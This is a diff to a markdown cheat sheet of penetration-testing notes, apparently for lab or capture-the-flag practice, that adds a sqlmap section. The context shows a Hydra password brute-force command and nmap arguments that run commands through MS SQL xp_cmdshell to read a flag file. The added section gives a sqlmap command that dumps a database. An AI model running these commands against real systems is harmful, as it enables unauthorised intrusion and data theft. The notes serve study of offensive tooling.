@@ -7,6 +7,7 @@
 	1. [Hydra](#Hydra)
 	2. [Msfconsole](#msfconsole)
 	3. [nmap](#nmap)
+	4. [sqlmap](#sqlmap)
 
 ---
 # Overview 
@@ -133,3 +134,15 @@ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_password.tx
 		- `--script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig"`
 			- `ms-sql-xp-cmshell.cm="type c:\flag.txt"`
 				- type is windows version of cat
+
+---
+
+## sqlmap
+
+#### `Usage: python3 sqlmap [options]`
+
+1. Use burpsuite to intercept a request and save it to a file
+2. pass the file to sqlmap
+	1. `sqlmap -r request.txt --dbms=mysql --dump`
+3. sqlmap will try to find a vulnerability and then dump the database
+
